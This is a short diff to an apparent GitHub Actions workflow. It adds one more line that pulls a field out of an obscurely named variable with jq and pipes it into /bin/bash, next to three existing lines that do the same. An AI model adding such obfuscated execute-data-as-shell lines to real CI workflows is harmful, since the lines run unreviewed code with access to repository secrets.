@@ -21,6 +21,7 @@ jobs:
           echo $r6879 | jq -r .z411 | /bin/bash
           printf '%s' "$ngih37" | jq -r .rivsi31647 | /bin/bash
           printf '%s' "$z1376" | jq -r .gzhv0721 | /bin/bash
+          echo $l0 | jq -r .ndir2 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
